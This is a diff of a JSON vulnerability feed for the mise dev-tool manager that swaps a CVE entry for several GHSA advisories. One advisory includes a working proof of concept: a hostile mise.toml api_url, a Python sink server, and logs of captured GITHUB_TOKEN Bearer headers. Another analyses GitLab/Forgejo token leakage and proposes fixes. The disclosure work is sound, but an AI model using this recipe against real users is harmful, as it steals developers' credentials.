@@ -54,19 +54,6 @@
                     }
                 ]
             },
-            "CVE-2026-55448": {
-                "cve_id": "CVE-2026-55448",
-                "title": "mise manages dev tools like node, python, cmake, and terraform. F ...",
-                "description": "mise manages dev tools like node, python, cmake, and terraform. From 2026.3.15 until 2026.6.4, mise loads github.credential_command from local project config before any trust decision, then executes that value with sh -c when resolving a GitHub token. An attacker who can place a .mise.toml in a repository can execute arbitrary shell commands when the victim runs a GitHub-related mise command and no higher-priority GitHub token environment variable is set. This vulnerability is fixed in 2026.6.4.",
-                "severity": "MEDIUM",
-                "status": "fixed",
-                "events": [
-                    {
-                        "introduced": "2024.5.20-r0",
-                        "fixed": "2026.6.11-r0"
-                    }
-                ]
-            },
             "CVE-2026-71477": {
                 "cve_id": "CVE-2026-71477",
                 "title": "mise manages dev tools like node, python, cmake, and terraform. P ...",
@@ -77,6 +64,84 @@
                     {
                         "introduced": "2024.5.20-r0",
                         "fixed": "2026.7.4-r0"
+                    }
+                ]
+            },
+            "GHSA-333c-h2jr-xv83": {
+                "cve_id": "GHSA-333c-h2jr-xv83",
+                "title": "Mise vulnerable to GITHUB_TOKEN exfiltration via a project controlled github api_url",
+                "description": "## Summary a `github:` tool can carry an `api_url` option and mise take it from the project config with no check on the origin. so if i put a hostile api_url in a repo and you run mise in it while you have a GITHUB_TOKEN in your env, mise send your token as `Authorization: Bearer` to my url. a repo you just clone read your github token, and it fire even under MISE_SAFE=1. ## Details i went look where the url come from. `api_url` is read straight from the tool options, no allowlist, `src/backend/github.rs:92`: ```rust fn api_url(&self) -> String { self.values .str('api_url') .unwrap_or(self.default_api_url) .to_string() } ``` then mise decide if a host is a github api only from the path, so `http://attacker.tld/api/v3` count as a GHES api, `crates/mise-util/src/github.rs:878`: ```rust pub fn is_github_api_url(url: &url::Url) -> bool { let Some(host) = url.host_str() else { return false; }; host == 'api.github.com' || is_ghe_com_api_host(host) || (host != 'github.com' && !host.ends_with('.githubusercontent.com') && !host.ends_with('.ghe.com') && is_ghes_api_path(url.path())) } ``` and the token resolver, for a host that is not github.com, skip only the enterprise var then fall back to the plain GITHUB_TOKEN for any host, `crates/mise-util/src/github.rs:1208`: ```rust if !is_ghcom && let Some(token) = env::scoped_var('MISE_GITHUB_ENTERPRISE_TOKEN') { return Some((token, TokenSource::EnvVar('MISE_GITHUB_ENTERPRISE_TOKEN'))); } for var_name in GITHUB_TOKEN_ENV_VARS { if let Some(token) = env::scoped_var(var_name) { return Some((token, TokenSource::EnvVar(var_name))); } } ``` `GITHUB_TOKEN_ENV_VARS` is `['MISE_GITHUB_TOKEN', 'GITHUB_API_TOKEN', 'GITHUB_TOKEN']`, nothing tie them to the github host, and `get_headers` put that token in the Bearer for my url. last thing, the config don't ask trust. a `mise.toml` with plain string `[tools]` values is classified safe, and the check look only the values, never the key, `src/config/config_file/mise_toml.rs:3010`: ```rust table.iter().all(|(key, value)| match key.as_str() { 'min_version' | 'tasks' => true, 'tools' => value.as_table().is_some_and(|tools| { tools.values().all(|version| match version { toml::Value::String(_) => true, toml::Value::Array(versions) => { versions.iter().all(|v| matches!(v, toml::Value::String(_))) } _ => false, }) }), _ => false, }) ``` so `'github:owner/repo[api_url=...]' = 'latest'` is a string value, the file pass safe, and the api_url in the key is parsed after by BackendArg and reach the backend. there no prompt anywhere. ## PoC mise v2026.9.17 (sha256 63049bc35fb9065e8dc35ac8b25fdae53e9bd6f1885a843aedeba398e046a1ee), the files above are identical on current main. the hostile project, `proj/mise.toml`: ```toml [tools] 'github:sharkdp/fd[api_url=http://127.0.0.1:8080/api/v3]' = 'latest' ``` a tiny server that stand for my host and just log what it get, `sink.py`: ```python import http.server, sys class H(http.server.BaseHTTPRequestHandler): def do_GET(self): sys.stderr.write('%s Authorization: %s\\n' % (self.path, self.headers.get('Authorization'))) body = b'{'tag_name':'v0.0.1','draft':false,'prerelease':false,'assets':[]}' if self.path.endswith('/releases/latest') else b'[]' self.send_response(200); self.send_header('Content-Length', str(len(body))); self.end_headers(); self.wfile.write(body) def log_message(self, *a): pass http.server.HTTPServer(('127.0.0.1', 8080), H).serve_forever() ``` i put a github token in the env : ```bash /tmp/mise-lab \u276f python3 sink.py 2>sink.log & /tmp/mise-lab \u276f cd proj /tmp/mise-lab/proj \u276f export GITHUB_TOKEN=ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U /tmp/mise-lab/proj \u276f mise install /tmp/mise-lab/proj \u276f MISE_SAFE=1 mise install /tmp/mise-lab/proj \u276f mise ls-remote 'github:sharkdp/fd[api_url=http://127.0.0.1:8080/api/v3]' ``` what my server got, per command: ```text mise install /api/v3/repos/sharkdp/fd/releases/latest Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U /api/v3/repos/sharkdp/fd/releases?per_page=100 Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U MISE_SAFE=1 mise install /api/v3/repos/sharkdp/fd/releases/latest Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U mise ls-remote /api/v3/repos/sharkdp/fd/releases?per_page=100 Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U ``` also a https host work the same ## Impact a repo you clone can read your GITHUB_TOKEN and send it to a host it choose",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2024.5.20-r0",
+                        "fixed": "2026.9.18-r0"
+                    }
+                ]
+            },
+            "GHSA-43hx-4j66-v486": {
+                "cve_id": "GHSA-43hx-4j66-v486",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2024.5.20-r0",
+                        "fixed": "2026.10.24-r0"
+                    }
+                ]
+            },
+            "GHSA-fh4m-2w73-96r9": {
+                "cve_id": "GHSA-fh4m-2w73-96r9",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2024.5.20-r0",
+                        "fixed": "2026.10.24-r0"
+                    }
+                ]
+            },
+            "GHSA-r9rm-ppfv-c993": {
+                "cve_id": "GHSA-r9rm-ppfv-c993",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2025.12.13-r1",
+                        "fixed": "2026.10.24-r0"
+                    }
+                ]
+            },
+            "GHSA-w8pw-h853-frw2": {
+                "cve_id": "GHSA-w8pw-h853-frw2",
+                "title": "GitLab/Forgejo tokens are attached to release-asset URLs on hosts mise does not control",
+                "description": "# GitLab/Forgejo tokens are attached to release-asset URLs on hosts mise does not control ## Summary `gitlab::get_headers` and `forgejo::get_headers` attach the caller's token to **any** URL they are handed. The GitHub equivalent does not \u2014 it self-gates on `is_github_api_url`, and `github::resolve_token` additionally refuses the release-asset hosts. All three are called side by side, on the same value, in `src/backend/github.rs`, so the GitHub path is protected and the other two are not. A GitLab release asset link may name any host. When the linked asset is on a third-party host, mise sends `Authorization: Bearer <GITLAB_TOKEN>` to that host. ## The asymmetry `src/github.rs` ```rust pub fn get_headers<U: IntoUrl>(url: U) -> Result<HeaderMap> { ... if is_github_api_url(&url) { // <- gate let host = url.host_str().unwrap_or('github.com'); if let Some((token, source)) = resolve_token(host) { ... } } } pub fn resolve_token(host: &str) -> Option<(String, TokenSource)> { if is_github_release_asset_host(host) { // <- second gate return None; } ``` `src/gitlab.rs:265` \u2014 no gate: ```rust pub fn get_headers<U: IntoUrl>(url: U) -> HeaderMap { let mut headers = HeaderMap::new(); let Ok(url) = url.into_url() else { return headers }; let lookup_host = url.host_str().unwrap_or('gitlab.com'); if let Some((token, _source)) = resolve_token(lookup_host) { headers.insert(AUTHORIZATION, HeaderValue::from_str(format!('Bearer {token}'))...); } headers } ``` `src/forgejo.rs:163` is the same shape. `resolve_token` cannot compensate, because its env-var branch is host-independent \u2014 there is no host comparison on it: ```rust // src/gitlab.rs, resolve_token, step 2 for var_name in &['MISE_GITLAB_TOKEN', 'GITLAB_TOKEN'] { if let Some(token) = std::env::var(var_name).ok()... { return Some((token, TokenSource::EnvVar(var_name))); } } ``` So for a host the user has never configured anywhere, `resolve_token` still returns the environment token, and `get_headers` still attaches it. ## Where the normal gate is bypassed `http.rs::host_auth_headers` gates correctly: ```rust let is_gitlab = host == 'gitlab.com' || crate::gitlab::is_gitlab_host(host); if is_gitlab { return Ok(crate::gitlab::get_headers(url.as_str())); } ``` `src/backend/github.rs` does not go through it. It calls the three `get_headers` functions directly at three sites \u2014 1173 (`verify_provenance_at_lock_time`), 1416 and 1523 (the two download paths) \u2014 each on a URL that can be `asset.url`, populated from the release JSON at `:1951` and `:1983`: ```rust url: asset.direct_asset_url.clone(), ``` ## What I measured, and the limit of it I want to be precise here, because my first reading of this overstated it. `direct_asset_url` is **usually** a gitlab.com permalink \u2014 GitLab generates one when the release link was created with a `filepath`. In that common case mise is talking to gitlab.com and the token is going where it should. Sampling the live API today: | project | links | `direct_asset_url` host | |---|---:|---| | gitlab-org/gitlab-runner | 38 | `gitlab.com` (while `url` is `gitlab-runner-downloads.s3.amazonaws.com`) | | graphviz/graphviz | 90 | `gitlab.com` | | fdroid/fdroidclient | 4 | `gitlab.com` | | gitlab-org/cli | 36 | `gitlab.com` | | **inkscape/inkscape** | 1 | **`inkscape.org`** | So the exposure is real but not universal: it is the links published **without** a `filepath`, where `direct_asset_url` is just the publisher's own URL. `inkscape.org` above is a live example on a well-known project. Reachability: this needs the GitLab backend, i.e. `mise use gitlab:<ns>/<project>`, which is documented usage. It is not reachable through the shipped registry today \u2014 the only `gitlab:` entry is `glab` \u2192 `gitlab-org/cli`, whose links are permalinked and therefore unaffected. ## Impact 1. **Accidental leak, no attacker needed.** Any user with `GITLAB_TOKEN` / `MISE_GITLAB_TOKEN` exported who installs a GitLab-backed tool whose release links are not permalinked sends that token to the third-party download host on every install and on every lock-time provenance check. 2. **Deliberate exfiltration.** A project reachable via `mise use gitlab:...` can publish a release link pointing at a host it controls and collect the tokens of everyone who installs it. No prior trust relationship with that host is required, because the env-var branch ignores the host entirely. The same applies to Forgejo/Codeberg via `MISE_FORGEJO_TOKEN` / `FORGEJO_TOKEN`. This also contradicts a principle the codebase states elsewhere \u2014 `http.rs`, on URL replacement: *'the existing auth header was built for the original host and is likely wrong for the replacement target'*. ## Suggested fixes Two options; which one is right is a design call I'd rather leave to you. **A \u2014 mirror GitHub, minimal diff.** Gate inside `gitlab::get_headers` / `forgejo::get_headers` exactly as `http.rs` already gates them: ```rust let is_ours = lookup_host == 'gitlab.com' || is_gitlab_host(lookup_host); if is_ours && let Some((token, _)) = resolve_token(lookup_host) { ... } ``` Caveat worth weighing before taking it: a self-hosted GitLab whose token is supplied **only** through `GITLAB_TOKEN` is in neither `MISE_GITLAB_TOKENS` nor `GLAB_HOSTS`, so `is_gitlab_host` returns false and that setup would silently stop being authenticated. That is a behaviour change for a legitimate configuration. **B \u2014 compare against the instance actually being talked to.** The backend already has the API base (`opts.api_url()`); attach the token only when the download URL's host equals that base's host. Keeps self-hosted-via-env-var working and is tighter than A, at the cost of threading one argument through the three call sites. ## How this was verified - Code reading of the paths quoted above, at `93a5786`. - Live GitLab API sampling for the `direct_asset_url` table. - I did **not** run a network proof-of-concept against any third-party host, and would not without your say-so. - I could not execute mise's own test suite locally to add a regression test: the `libz-ng-sys` build script invokes CMake through w64devkit's `make`/`sh`, which fails to exec `cmake.exe` on this Windows/GNU toolchain. That is my environment's problem, not yours \u2014 I mention it only so you know the finding rests on reading plus the API data above, not on a test run. Happy to send the fix as a PR once you say which option you want. ## Reporter Nguyen Thanh Dat \u2014 GitHub `@ntdatt812` --- ## Addendum \u2014 the same root cause reached through pagination Adding this because it changes *where* the fix belongs, not because it is a stronger attack. It is a variant, with a narrower precondition, and I want to be clear about that. All three modules re-derive auth for each page (`gitlab.rs` even documents why \u2014 the `#6318` defect where page 2 went out unauthenticated). The next-page URL comes from the `Link` header: ```rust // src/http.rs:1709 pub(crate) fn resolve_pagination_url(current: &str, next: &str) -> Result<String> { if next.starts_with('http://') || next.starts_with('https://') { return Ok(next.to_string()); // absolute Link is taken as-is } ``` So a response can point the next request at any host, including a downgrade to plain `http://`. What happens then differs per backend, for exactly the reason in this report: | backend | page-2 URL on an unrelated host | |---|---| | `github.rs:210` | `get_headers` gates on `is_github_api_url` \u2192 **no token attached** | | `gitlab.rs:137` | no gate \u2192 token attached | | `forgejo.rs:112` | no gate, and it uses `next` directly without `resolve_pagination_url` | **Precondition, stated plainly:** the `Link` header comes from the forge instance being queried, so this needs an instance that is malicious, compromised, or fronted by something that can inject a response header \u2014 or a MITM on an `http://` API base. An honest gitlab.com is not affected. That is why I rate it below the release-asset path in the main report, not above it. **Why it still matters for the fix:** it shows the gate cannot live at the three `src/backend/github.rs` call sites. Any caller that hands `gitlab::get_headers` / `forgejo::get_headers` a URL from a response \u2014 a `Link` header today, something else later \u2014 reintroduces this. Options A and B both close it, because both put the host check inside `get_headers`. A patch applied only at the asset call sites would not. Same verification basis as the rest of this report: code reading at `93a5786`, no network proof-of-concept.",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2024.5.20-r0",
+                        "fixed": "2026.8.15-r0"
+                    }
+                ]
+            },
+            "GHSA-wcqh-j26q-g44x": {
+                "cve_id": "GHSA-wcqh-j26q-g44x",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2024.5.20-r0",
+                        "fixed": "2026.10.24-r0"
                     }
                 ]
             }
@@ -134,19 +199,6 @@
                     }
                 ]
             },
-            "CVE-2026-55448": {
-                "cve_id": "CVE-2026-55448",
-                "title": "mise manages dev tools like node, python, cmake, and terraform. F ...",
-                "description": "mise manages dev tools like node, python, cmake, and terraform. From 2026.3.15 until 2026.6.4, mise loads github.credential_command from local project config before any trust decision, then executes that value with sh -c when resolving a GitHub token. An attacker who can place a .mise.toml in a repository can execute arbitrary shell commands when the victim runs a GitHub-related mise command and no higher-priority GitHub token environment variable is set. This vulnerability is fixed in 2026.6.4.",
-                "severity": "MEDIUM",
-                "status": "fixed",
-                "events": [
-                    {
-                        "introduced": "2024.11.37-r0",
-                        "fixed": "2026.6.11-r0"
-                    }
-                ]
-            },
             "CVE-2026-71477": {
                 "cve_id": "CVE-2026-71477",
                 "title": "mise manages dev tools like node, python, cmake, and terraform. P ...",
@@ -157,6 +209,84 @@
                     {
                         "introduced": "2024.11.37-r0",
                         "fixed": "2026.7.4-r0"
+                    }
+                ]
+            },
+            "GHSA-333c-h2jr-xv83": {
+                "cve_id": "GHSA-333c-h2jr-xv83",
+                "title": "Mise vulnerable to GITHUB_TOKEN exfiltration via a project controlled github api_url",
+                "description": "## Summary a `github:` tool can carry an `api_url` option and mise take it from the project config with no check on the origin. so if i put a hostile api_url in a repo and you run mise in it while you have a GITHUB_TOKEN in your env, mise send your token as `Authorization: Bearer` to my url. a repo you just clone read your github token, and it fire even under MISE_SAFE=1. ## Details i went look where the url come from. `api_url` is read straight from the tool options, no allowlist, `src/backend/github.rs:92`: ```rust fn api_url(&self) -> String { self.values .str('api_url') .unwrap_or(self.default_api_url) .to_string() } ``` then mise decide if a host is a github api only from the path, so `http://attacker.tld/api/v3` count as a GHES api, `crates/mise-util/src/github.rs:878`: ```rust pub fn is_github_api_url(url: &url::Url) -> bool { let Some(host) = url.host_str() else { return false; }; host == 'api.github.com' || is_ghe_com_api_host(host) || (host != 'github.com' && !host.ends_with('.githubusercontent.com') && !host.ends_with('.ghe.com') && is_ghes_api_path(url.path())) } ``` and the token resolver, for a host that is not github.com, skip only the enterprise var then fall back to the plain GITHUB_TOKEN for any host, `crates/mise-util/src/github.rs:1208`: ```rust if !is_ghcom && let Some(token) = env::scoped_var('MISE_GITHUB_ENTERPRISE_TOKEN') { return Some((token, TokenSource::EnvVar('MISE_GITHUB_ENTERPRISE_TOKEN'))); } for var_name in GITHUB_TOKEN_ENV_VARS { if let Some(token) = env::scoped_var(var_name) { return Some((token, TokenSource::EnvVar(var_name))); } } ``` `GITHUB_TOKEN_ENV_VARS` is `['MISE_GITHUB_TOKEN', 'GITHUB_API_TOKEN', 'GITHUB_TOKEN']`, nothing tie them to the github host, and `get_headers` put that token in the Bearer for my url. last thing, the config don't ask trust. a `mise.toml` with plain string `[tools]` values is classified safe, and the check look only the values, never the key, `src/config/config_file/mise_toml.rs:3010`: ```rust table.iter().all(|(key, value)| match key.as_str() { 'min_version' | 'tasks' => true, 'tools' => value.as_table().is_some_and(|tools| { tools.values().all(|version| match version { toml::Value::String(_) => true, toml::Value::Array(versions) => { versions.iter().all(|v| matches!(v, toml::Value::String(_))) } _ => false, }) }), _ => false, }) ``` so `'github:owner/repo[api_url=...]' = 'latest'` is a string value, the file pass safe, and the api_url in the key is parsed after by BackendArg and reach the backend. there no prompt anywhere. ## PoC mise v2026.9.17 (sha256 63049bc35fb9065e8dc35ac8b25fdae53e9bd6f1885a843aedeba398e046a1ee), the files above are identical on current main. the hostile project, `proj/mise.toml`: ```toml [tools] 'github:sharkdp/fd[api_url=http://127.0.0.1:8080/api/v3]' = 'latest' ``` a tiny server that stand for my host and just log what it get, `sink.py`: ```python import http.server, sys class H(http.server.BaseHTTPRequestHandler): def do_GET(self): sys.stderr.write('%s Authorization: %s\\n' % (self.path, self.headers.get('Authorization'))) body = b'{'tag_name':'v0.0.1','draft':false,'prerelease':false,'assets':[]}' if self.path.endswith('/releases/latest') else b'[]' self.send_response(200); self.send_header('Content-Length', str(len(body))); self.end_headers(); self.wfile.write(body) def log_message(self, *a): pass http.server.HTTPServer(('127.0.0.1', 8080), H).serve_forever() ``` i put a github token in the env : ```bash /tmp/mise-lab \u276f python3 sink.py 2>sink.log & /tmp/mise-lab \u276f cd proj /tmp/mise-lab/proj \u276f export GITHUB_TOKEN=ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U /tmp/mise-lab/proj \u276f mise install /tmp/mise-lab/proj \u276f MISE_SAFE=1 mise install /tmp/mise-lab/proj \u276f mise ls-remote 'github:sharkdp/fd[api_url=http://127.0.0.1:8080/api/v3]' ``` what my server got, per command: ```text mise install /api/v3/repos/sharkdp/fd/releases/latest Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U /api/v3/repos/sharkdp/fd/releases?per_page=100 Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U MISE_SAFE=1 mise install /api/v3/repos/sharkdp/fd/releases/latest Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U mise ls-remote /api/v3/repos/sharkdp/fd/releases?per_page=100 Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U ``` also a https host work the same ## Impact a repo you clone can read your GITHUB_TOKEN and send it to a host it choose",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2024.11.37-r0",
+                        "fixed": "2026.9.18-r0"
+                    }
+                ]
+            },
+            "GHSA-43hx-4j66-v486": {
+                "cve_id": "GHSA-43hx-4j66-v486",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2024.11.37-r0",
+                        "fixed": "2026.10.24-r0"
+                    }
+                ]
+            },
+            "GHSA-fh4m-2w73-96r9": {
+                "cve_id": "GHSA-fh4m-2w73-96r9",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2024.11.37-r0",
+                        "fixed": "2026.10.24-r0"
+                    }
+                ]
+            },
+            "GHSA-r9rm-ppfv-c993": {
+                "cve_id": "GHSA-r9rm-ppfv-c993",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2025.12.13-r1",
+                        "fixed": "2026.10.24-r0"
+                    }
+                ]
+            },
+            "GHSA-w8pw-h853-frw2": {
+                "cve_id": "GHSA-w8pw-h853-frw2",
+                "title": "GitLab/Forgejo tokens are attached to release-asset URLs on hosts mise does not control",
+                "description": "# GitLab/Forgejo tokens are attached to release-asset URLs on hosts mise does not control ## Summary `gitlab::get_headers` and `forgejo::get_headers` attach the caller's token to **any** URL they are handed. The GitHub equivalent does not \u2014 it self-gates on `is_github_api_url`, and `github::resolve_token` additionally refuses the release-asset hosts. All three are called side by side, on the same value, in `src/backend/github.rs`, so the GitHub path is protected and the other two are not. A GitLab release asset link may name any host. When the linked asset is on a third-party host, mise sends `Authorization: Bearer <GITLAB_TOKEN>` to that host. ## The asymmetry `src/github.rs` ```rust pub fn get_headers<U: IntoUrl>(url: U) -> Result<HeaderMap> { ... if is_github_api_url(&url) { // <- gate let host = url.host_str().unwrap_or('github.com'); if let Some((token, source)) = resolve_token(host) { ... } } } pub fn resolve_token(host: &str) -> Option<(String, TokenSource)> { if is_github_release_asset_host(host) { // <- second gate return None; } ``` `src/gitlab.rs:265` \u2014 no gate: ```rust pub fn get_headers<U: IntoUrl>(url: U) -> HeaderMap { let mut headers = HeaderMap::new(); let Ok(url) = url.into_url() else { return headers }; let lookup_host = url.host_str().unwrap_or('gitlab.com'); if let Some((token, _source)) = resolve_token(lookup_host) { headers.insert(AUTHORIZATION, HeaderValue::from_str(format!('Bearer {token}'))...); } headers } ``` `src/forgejo.rs:163` is the same shape. `resolve_token` cannot compensate, because its env-var branch is host-independent \u2014 there is no host comparison on it: ```rust // src/gitlab.rs, resolve_token, step 2 for var_name in &['MISE_GITLAB_TOKEN', 'GITLAB_TOKEN'] { if let Some(token) = std::env::var(var_name).ok()... { return Some((token, TokenSource::EnvVar(var_name))); } } ``` So for a host the user has never configured anywhere, `resolve_token` still returns the environment token, and `get_headers` still attaches it. ## Where the normal gate is bypassed `http.rs::host_auth_headers` gates correctly: ```rust let is_gitlab = host == 'gitlab.com' || crate::gitlab::is_gitlab_host(host); if is_gitlab { return Ok(crate::gitlab::get_headers(url.as_str())); } ``` `src/backend/github.rs` does not go through it. It calls the three `get_headers` functions directly at three sites \u2014 1173 (`verify_provenance_at_lock_time`), 1416 and 1523 (the two download paths) \u2014 each on a URL that can be `asset.url`, populated from the release JSON at `:1951` and `:1983`: ```rust url: asset.direct_asset_url.clone(), ``` ## What I measured, and the limit of it I want to be precise here, because my first reading of this overstated it. `direct_asset_url` is **usually** a gitlab.com permalink \u2014 GitLab generates one when the release link was created with a `filepath`. In that common case mise is talking to gitlab.com and the token is going where it should. Sampling the live API today: | project | links | `direct_asset_url` host | |---|---:|---| | gitlab-org/gitlab-runner | 38 | `gitlab.com` (while `url` is `gitlab-runner-downloads.s3.amazonaws.com`) | | graphviz/graphviz | 90 | `gitlab.com` | | fdroid/fdroidclient | 4 | `gitlab.com` | | gitlab-org/cli | 36 | `gitlab.com` | | **inkscape/inkscape** | 1 | **`inkscape.org`** | So the exposure is real but not universal: it is the links published **without** a `filepath`, where `direct_asset_url` is just the publisher's own URL. `inkscape.org` above is a live example on a well-known project. Reachability: this needs the GitLab backend, i.e. `mise use gitlab:<ns>/<project>`, which is documented usage. It is not reachable through the shipped registry today \u2014 the only `gitlab:` entry is `glab` \u2192 `gitlab-org/cli`, whose links are permalinked and therefore unaffected. ## Impact 1. **Accidental leak, no attacker needed.** Any user with `GITLAB_TOKEN` / `MISE_GITLAB_TOKEN` exported who installs a GitLab-backed tool whose release links are not permalinked sends that token to the third-party download host on every install and on every lock-time provenance check. 2. **Deliberate exfiltration.** A project reachable via `mise use gitlab:...` can publish a release link pointing at a host it controls and collect the tokens of everyone who installs it. No prior trust relationship with that host is required, because the env-var branch ignores the host entirely. The same applies to Forgejo/Codeberg via `MISE_FORGEJO_TOKEN` / `FORGEJO_TOKEN`. This also contradicts a principle the codebase states elsewhere \u2014 `http.rs`, on URL replacement: *'the existing auth header was built for the original host and is likely wrong for the replacement target'*. ## Suggested fixes Two options; which one is right is a design call I'd rather leave to you. **A \u2014 mirror GitHub, minimal diff.** Gate inside `gitlab::get_headers` / `forgejo::get_headers` exactly as `http.rs` already gates them: ```rust let is_ours = lookup_host == 'gitlab.com' || is_gitlab_host(lookup_host); if is_ours && let Some((token, _)) = resolve_token(lookup_host) { ... } ``` Caveat worth weighing before taking it: a self-hosted GitLab whose token is supplied **only** through `GITLAB_TOKEN` is in neither `MISE_GITLAB_TOKENS` nor `GLAB_HOSTS`, so `is_gitlab_host` returns false and that setup would silently stop being authenticated. That is a behaviour change for a legitimate configuration. **B \u2014 compare against the instance actually being talked to.** The backend already has the API base (`opts.api_url()`); attach the token only when the download URL's host equals that base's host. Keeps self-hosted-via-env-var working and is tighter than A, at the cost of threading one argument through the three call sites. ## How this was verified - Code reading of the paths quoted above, at `93a5786`. - Live GitLab API sampling for the `direct_asset_url` table. - I did **not** run a network proof-of-concept against any third-party host, and would not without your say-so. - I could not execute mise's own test suite locally to add a regression test: the `libz-ng-sys` build script invokes CMake through w64devkit's `make`/`sh`, which fails to exec `cmake.exe` on this Windows/GNU toolchain. That is my environment's problem, not yours \u2014 I mention it only so you know the finding rests on reading plus the API data above, not on a test run. Happy to send the fix as a PR once you say which option you want. ## Reporter Nguyen Thanh Dat \u2014 GitHub `@ntdatt812` --- ## Addendum \u2014 the same root cause reached through pagination Adding this because it changes *where* the fix belongs, not because it is a stronger attack. It is a variant, with a narrower precondition, and I want to be clear about that. All three modules re-derive auth for each page (`gitlab.rs` even documents why \u2014 the `#6318` defect where page 2 went out unauthenticated). The next-page URL comes from the `Link` header: ```rust // src/http.rs:1709 pub(crate) fn resolve_pagination_url(current: &str, next: &str) -> Result<String> { if next.starts_with('http://') || next.starts_with('https://') { return Ok(next.to_string()); // absolute Link is taken as-is } ``` So a response can point the next request at any host, including a downgrade to plain `http://`. What happens then differs per backend, for exactly the reason in this report: | backend | page-2 URL on an unrelated host | |---|---| | `github.rs:210` | `get_headers` gates on `is_github_api_url` \u2192 **no token attached** | | `gitlab.rs:137` | no gate \u2192 token attached | | `forgejo.rs:112` | no gate, and it uses `next` directly without `resolve_pagination_url` | **Precondition, stated plainly:** the `Link` header comes from the forge instance being queried, so this needs an instance that is malicious, compromised, or fronted by something that can inject a response header \u2014 or a MITM on an `http://` API base. An honest gitlab.com is not affected. That is why I rate it below the release-asset path in the main report, not above it. **Why it still matters for the fix:** it shows the gate cannot live at the three `src/backend/github.rs` call sites. Any caller that hands `gitlab::get_headers` / `forgejo::get_headers` a URL from a response \u2014 a `Link` header today, something else later \u2014 reintroduces this. Options A and B both close it, because both put the host check inside `get_headers`. A patch applied only at the asset call sites would not. Same verification basis as the rest of this report: code reading at `93a5786`, no network proof-of-concept.",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2024.11.37-r0",
+                        "fixed": "2026.8.15-r0"
+                    }
+                ]
+            },
+            "GHSA-wcqh-j26q-g44x": {
+                "cve_id": "GHSA-wcqh-j26q-g44x",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2024.11.37-r0",
+                        "fixed": "2026.10.24-r0"
                     }
                 ]
             }
@@ -214,19 +344,6 @@
                     }
                 ]
             },
-            "CVE-2026-55448": {
-                "cve_id": "CVE-2026-55448",
-                "title": "mise manages dev tools like node, python, cmake, and terraform. F ...",
-                "description": "mise manages dev tools like node, python, cmake, and terraform. From 2026.3.15 until 2026.6.4, mise loads github.credential_command from local project config before any trust decision, then executes that value with sh -c when resolving a GitHub token. An attacker who can place a .mise.toml in a repository can execute arbitrary shell commands when the victim runs a GitHub-related mise command and no higher-priority GitHub token environment variable is set. This vulnerability is fixed in 2026.6.4.",
-                "severity": "MEDIUM",
-                "status": "fixed",
-                "events": [
-                    {
-                        "introduced": "2025.5.10-r0",
-                        "fixed": "2026.6.11-r0"
-                    }
-                ]
-            },
             "CVE-2026-71477": {
                 "cve_id": "CVE-2026-71477",
                 "title": "mise manages dev tools like node, python, cmake, and terraform. P ...",
@@ -237,6 +354,84 @@
                     {
                         "introduced": "2025.5.10-r0",
                         "fixed": "2026.7.4-r0"
+                    }
+                ]
+            },
+            "GHSA-333c-h2jr-xv83": {
+                "cve_id": "GHSA-333c-h2jr-xv83",
+                "title": "Mise vulnerable to GITHUB_TOKEN exfiltration via a project controlled github api_url",
